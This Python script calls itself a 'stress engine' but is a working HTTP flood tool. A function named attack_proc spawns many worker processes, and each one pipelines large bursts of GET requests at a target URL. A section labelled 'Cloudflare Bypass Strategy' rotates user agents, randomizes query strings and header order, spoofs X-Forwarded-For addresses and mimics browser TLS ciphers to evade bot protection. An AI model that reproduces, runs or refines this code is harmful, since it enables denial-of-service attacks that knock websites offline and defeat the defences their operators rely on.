import sys
import multiprocessing
import time
import random
import string
import socket
import ssl

# Monster Stres Engine V8 Platinum (Pacing Edition)
# Professional Grade: Time/Volume Limits + RPS Control (Pacing)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

def get_random_string(length=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shared_err, limit_type, limit_val, rps_pacer):
    from urllib.parse import urlparse
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc
        path = parsed.path if parsed.path else "/"
        scheme = parsed.scheme
    except:
        host, path, scheme = target_url, "/", "http"

    target_port = int(port) if port else (443 if scheme == 'https' else 80)
    
    while True:
        if limit_type == 'time' and time.time() >= end_time: break
        if limit_type == 'req' and shared_req.value >= limit_val: break

        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)
            
            if scheme == 'https' or target_port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                # Mimic modern cipher suites for TLS fingerprinting
                ctx.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
                s = ctx.wrap_socket(s, server_hostname=host if not host.replace('.','').isdigit() else None)
            
            s.connect((host, target_port))
            s.settimeout(1)

            # ADVANCED PAYLOAD POOL (Coudflare Bypass Strategy)
            payload_pool = []
            for _ in range(500):
                ua = random.choice(USER_AGENTS)
                rand_path = f"{path}{'&' if '?' in path else '?'}{get_random_string(3)}={get_random_string(10)}"
                
                # Randomized Header Order & Values
                headers = [
                    f"GET {rand_path} HTTP/1.1",
                    f"Host: {host}",
                    f"User-Agent: {ua}",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "Accept-Language: en-US,en;q=0.9",
                    "Accept-Encoding: gzip, deflate, br",
                    "Upgrade-Insecure-Requests: 1",
                    "Sec-Fetch-Dest: document",
                    "Sec-Fetch-Mode: navigate",
                    "Sec-Fetch-Site: none",
                    "Sec-Fetch-User: ?1",
                    "Cache-Control: max-age=0",
                    "Connection: keep-alive",
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                ]
                random.shuffle(headers[1:]) # Don't shuffle the request line
                full_h = "\r\n".join(headers) + "\r\n\r\n"
                payload_pool.append(full_h.encode('utf-8'))

            # EXTREME INTENSITY BURST LOOP (Fire & Forget)
            while True:
                if limit_type == 'time' and time.time() >= end_time: break
                if limit_type == 'req' and shared_req.value >= limit_val: break
                
                if rps_pacer > 0:
                    time.sleep(rps_pacer)

                # Instant Blast (Large Burst)
                burst_size = 500 if rps_pacer == 0 else 1 
                full_payload = b"".join(random.choices(payload_pool, k=burst_size))
                
                try:
                    s.sendall(full_payload)
                    with shared_req.get_lock(): shared_req.value += burst_size
                    with shared_bytes.get_lock(): shared_bytes.value += len(full_payload)
                except:
                    break # Reconnect on socket death

        except Exception:
            with shared_err.get_lock(): shared_err.value += 1
            # No sleep for max intensity if rps=0
            if rps_pacer > 0: time.sleep(0.01)
        finally:
            if s:
                try: s.close()
                except: pass

def main():
    if len(sys.argv) < 8:
        sys.exit(1)

    url, th_count, limit_val, port, mode, limit_type, rps = sys.argv[1:8]
    th_count = int(th_count)
    limit_val = int(limit_val)
    rps = int(rps)

    shared_req = multiprocessing.Value('i', 0)
    shared_bytes = multiprocessing.Value('Q', 0)
    shared_err = multiprocessing.Value('i', 0)

    # Calculate Pacer Delay per Process
    # rps_pacer is the delay between requests in a single thread
    rps_pacer = 0
    if rps > 0:
        rps_per_th = rps / th_count
        if rps_per_th > 0:
            rps_pacer = 1.0 / rps_per_th

    end_time = time.time() + limit_val if limit_type == 'time' else time.time() + 86400 * 7
    
    label = f"{rps} RPS" if rps > 0 else "MAX SPEED"
    print(f"[*] Engine V8 PLATINUM | Mode: {limit_type.upper()} | Pacing: {label}")
    print(f"[*] Target: {url} | Workers: {th_count}")
    sys.stdout.flush()

    processes = []
    for _ in range(th_count):
        p = multiprocessing.Process(target=attack_proc, args=(url, end_time, port, mode, shared_req, shared_bytes, shared_err, limit_type, limit_val, rps_pacer))
        p.daemon = True
        p.start()
        processes.append(p)

    start_time = time.time()
    last_bytes = 0
    try:
        while True:
            if limit_type == 'time' and time.time() >= end_time: break
            if limit_type == 'req' and shared_req.value >= limit_val: break
            
            time.sleep(1)
            elapsed = int(time.time() - start_time)
            curr_bytes = shared_bytes.value
            mbps = ((curr_bytes - last_bytes) * 8) / (1024 * 1024)
            last_bytes = curr_bytes
            
            progress = ""
            if limit_type == 'time':
                progress = f"{elapsed}:{limit_val}"
            else:
                perc = min(100, int((shared_req.value / limit_val) * 100))
                progress = f"{perc}:100"

            print(f"PROGRESS:{progress} | REQ: {shared_req.value} | THROUGHPUT: {mbps:.2f} Mbps | ERRORS: {shared_err.value}")
            sys.stdout.flush()
    except KeyboardInterrupt:
        pass

    for p in processes: p.terminate()
    print("[*] Operation Finished.")

if __name__ == "__main__":
    main()
